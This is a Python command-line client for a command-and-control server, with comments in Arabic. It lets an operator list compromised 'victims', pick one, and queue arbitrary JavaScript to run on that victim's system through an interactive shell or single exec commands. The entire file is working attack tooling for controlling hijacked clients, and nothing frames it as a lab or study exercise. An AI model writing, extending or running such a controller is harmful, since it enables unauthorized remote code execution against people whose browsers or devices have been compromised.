import requests
import json
import readline
import argparse
from datetime import datetime

class C2Client:
    def __init__(self, server_url="http://localhost:5000"):
        self.server_url = server_url
        self.session = requests.Session()
        self.current_victim = None
        self.command_history = []

    def send_command(self, victim_id, js_code):
        """إرسال أمر جافاسكريبت إلى الضحية"""
        endpoint = f"{self.server_url}/api/execute"
        payload = {
            "victim_id": victim_id,
            "command": js_code
        }
        
        try:
            response = self.session.post(
                endpoint,
                json=payload,
                headers={'Content-Type': 'application/json'}
            )
            return response.json()
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def list_victims(self):
        """الحصول على قائمة الضحايا المتصلين"""
        try:
            # تحتاج لتنفيذ هذه الوظيفة في السيرفر أولاً
            response = self.session.get(f"{self.server_url}/api/victims")
            return response.json()
        except Exception as e:
            print(f"Error: {e}")
            return []

    def interactive_shell(self):
        """وضع التفاعل المباشر مع الضحية"""
        if not self.current_victim:
            print("No victim selected. Use 'connect <id>' first.")
            return

        print(f"Interactive JavaScript Shell - Victim: {self.current_victim}")
        print("Type 'exit' to quit\n")

        while True:
            try:
                # دعم السهم الأعلى للأوامر السابقة
                js_code = input("JS> ")
                
                if js_code.lower() in ['exit', 'quit']:
                    break
                
                if not js_code.strip():
                    continue

                self.command_history.append(js_code)
                result = self.send_command(self.current_victim, js_code)
                
                if result.get('status') == 'success':
                    print("[+] Command queued successfully")
                else:
                    print(f"[!] Error: {result.get('message', 'Unknown error')}")
            
            except KeyboardInterrupt:
                print("\nType 'exit' to quit")
            except Exception as e:
                print(f"[!] Fatal error: {e}")

def main():
    parser = argparse.ArgumentParser(description="C2 Command Line Interface")
    parser.add_argument("-s", "--server", help="C2 Server URL", default="http://localhost:5000")
    args = parser.parse_args()

    client = C2Client(args.server)

    print(f"Connected to C2 server at {args.server}\n")
    print("Available commands:")
    print("  connect <victim_id> - Select a victim")
    print("  list                - List connected victims")
    print("  shell               - Start interactive shell")
    print("  exec <js_code>      - Execute one-time command")
    print("  exit                - Quit the program\n")

    while True:
        try:
            cmd = input("C2> ").strip()
            
            if not cmd:
                continue
            
            if cmd.lower() in ['exit', 'quit']:
                break
                
            elif cmd.startswith("connect "):
                victim_id = cmd.split(" ", 1)[1]
                client.current_victim = victim_id
                print(f"[+] Connected to victim {victim_id}")

            elif cmd == "list":
                victims = client.list_victims()
                print("\nConnected Victims:")
                for victim in victims:
                    last_seen = datetime.fromisoformat(victim['last_seen']).strftime('%Y-%m-%d %H:%M:%S')
                    print(f"  ID: {victim['id']} | Last Seen: {last_seen}")

            elif cmd == "shell":
                client.interactive_shell()

            elif cmd.startswith("exec "):
                if not client.current_victim:
                    print("[!] No victim selected. Use 'connect <id>' first.")
                    continue
                
                js_code = cmd.split(" ", 1)[1]
                result = client.send_command(client.current_victim, js_code)
                print(json.dumps(result, indent=2))

            else:
                print("[!] Unknown command. Try 'list', 'connect', 'shell', or 'exec'")
                
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
